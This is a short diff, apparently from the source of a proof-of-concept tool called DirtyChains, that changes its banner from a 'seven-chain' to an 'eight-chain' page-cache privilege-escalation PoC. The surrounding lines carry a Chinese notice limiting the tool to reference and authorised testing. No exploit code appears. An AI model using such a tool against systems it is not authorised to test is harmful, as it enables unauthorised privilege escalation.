-                   "\033[36mDirtyChains 七链页缓存提权 PoC\033[0m  图形前端"
+                   "\033[36mDirtyChains 八链页缓存提权 PoC\033[0m  图形前端"
                    "  \033[2m构建 %s\033[0m\n"
                    "\033[2m引擎: %s\033[0m\n"
                    "\033[2m仅供参考与授权测试。先用「检查配置」和「自测」判断本机可用性。\033[0m\n",
